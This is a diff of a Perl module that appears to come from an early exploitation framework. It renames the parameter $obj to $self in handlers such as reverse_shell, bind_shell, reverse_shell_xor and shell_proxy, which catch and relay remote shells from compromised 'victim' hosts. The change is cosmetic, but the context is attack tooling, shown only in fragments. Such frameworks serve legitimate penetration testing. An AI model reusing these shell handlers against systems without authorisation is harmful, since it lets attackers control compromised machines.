@@ -24,7 +24,7 @@ use strict;
 
 sub shell_proxy
 {
-    my ($obj, $shell, $opt) = @_;
+    my ($self, $shell, $opt) = @_;
     my $b = $opt->{'BROWSER'};
     my $s = IO::Socket::INET->new (
                 Proto => "tcp",
@@ -72,7 +72,7 @@ sub shell_proxy
                 $victim->send("[*] Connected to " . $shell->peerhost . ":" . $shell->peerport . "\n\n");
             }
             
-            $obj->DataPump($shell, $victim, sub { });
+            $self->DataPump($shell, $victim, sub { });
             
             $victim->send("[*] Exiting Shell Proxy...\n");
             $victim->close();
@@ -87,7 +87,7 @@ sub shell_proxy
 
 sub reverse_shell
 {
-    my ($obj, $pay, $opt, $exploit) = @_;
+    my ($self, $pay, $opt, $exploit) = @_;
     my $b = $opt->{'BROWSER'};    
     
     my $s = IO::Socket::INET->new (
@@ -100,7 +100,7 @@ sub reverse_shell
 
     if (! $s)
     {
-        $obj->set_error("could not start listener: $!");
+        $self->set_error("could not start listener: $!");
         return undef;
     }
 
@@ -134,7 +134,7 @@ sub reverse_shell
 
             my $callback = defined($opt->{'HCALLBACK'}) ? $opt->{'HCALLBACK'} : sub {};
             $callback->("CONNECT", $victim);
-            $obj->shell_proxy($victim, $opt);
+            $self->shell_proxy($victim, $opt);
             $callback->("DISCONNECT", $victim);
         }
         # work around a massive array of win32 signaling bugs
@@ -159,7 +159,7 @@ sub reverse_shell
 
 sub bind_shell
 {
-    my ($obj, $pay, $opt, $exploit) = @_;
+    my ($self, $pay, $opt, $exploit) = @_;
     my $b = $opt->{'BROWSER'};    
     my $stopconnect = 0;
     my $victim;
@@ -194,7 +194,7 @@ sub bind_shell
                     $b->send("[*] Connected to " . $victim->peerhost() . ":" . $victim->peerport() . "...\n\n");
                     my $callback = defined($opt->{'HCALLBACK'}) ? $opt->{'HCALLBACK'} : sub {};
                     $callback->("CONNECT", $victim);
-                    $obj->shell_proxy($victim, $opt);
+                    $self->shell_proxy($victim, $opt);
                     $callback->("DISCONNECT", $victim);
                 } else {
                     select(undef, undef, undef, 0.5);
@@ -222,7 +222,7 @@ sub bind_shell
 # still broken :(
 sub XXXfindsock_shell
 {
-    my ($obj, $pay, $opt, $exploit) = @_;
+    my ($self, $pay, $opt, $exploit) = @_;
     my $b = $opt->{'BROWSER'};
     my $s = $opt->{'HCSOCK'};
     Pex::Unblock($s);
@@ -259,7 +259,7 @@ sub XXXfindsock_shell
             
             my $callback = defined($opt->{'HCALLBACK'}) ? $opt->{'HCALLBACK'} : sub {};
             $callback->("CONNECT", $s);
-            $obj->shell_proxy($s, $opt);
+            $self->shell_proxy($s, $opt);
             $callback->("DISCONNECT", $s);
         }
         # work around a massive array of win32 signaling bugs
@@ -277,7 +277,7 @@ sub XXXfindsock_shell
 
 sub findsock_shell_exp
 {
-    my ($obj, $opt, $e) = @_;
+    my ($self, $opt, $e) = @_;
     
     # this is our socket to the parent
     my $s = $opt->{'HPSOCK'};
@@ -296,7 +296,7 @@ sub findsock_shell_exp
         
         $r = <$s>;
         while (! defined($r)) { $r = <$s>; select(undef, undef, undef, 0.1) }
-        $obj->DataPump($s, $x, sub { });
+        $self->DataPump($s, $x, sub { });
         exit(0);
     }
 }
@@ -304,7 +304,7 @@ sub findsock_shell_exp
 
 sub reverse_shell_xor
 {
-    my ($obj, $pay, $opt, $exploit) = @_;
+    my ($self, $pay, $opt, $exploit) = @_;
     
     my $s = IO::Socket::INET->new (
                 Proto => "tcp",
@@ -316,7 +316,7 @@ sub reverse_shell_xor
 
     if (! $s)
     {
-        $obj->set_error("could not start listener: $!");
+        $self->set_error("could not start listener: $!");
         return undef;
     }
 
@@ -349,13 +349,13 @@ sub reverse_shell_xor
 
             print STDERR "[*] Connection from " . $victim->peerhost() . ":" . $victim->peerport() . "...\n\n";
 
-            my $console = $obj->ConsoleStart();
+            my $console = $self->ConsoleStart();
             my $callback = defined($opt->{'HCALLBACK'}) ? $opt->{'HCALLBACK'} : sub {};
             $callback->("CONNECT", $victim);
 
-            $obj->DataPumpXor($console, $victim, $callback, $xor_key);
+            $self->DataPumpXor($console, $victim, $callback, $xor_key);
 
-            $obj->ConsoleStop($console);
+            $self->ConsoleStop($console);
             $callback->("DISCONNECT", $victim);
             $victim->close();
             undef($victim);
